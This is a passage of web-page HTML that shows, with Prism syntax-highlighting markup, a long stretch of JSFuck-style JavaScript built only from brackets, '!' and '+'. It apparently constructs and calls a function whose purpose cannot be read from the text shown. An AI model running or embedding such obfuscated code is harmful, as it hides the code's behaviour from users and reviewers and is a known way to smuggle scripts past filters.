punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token 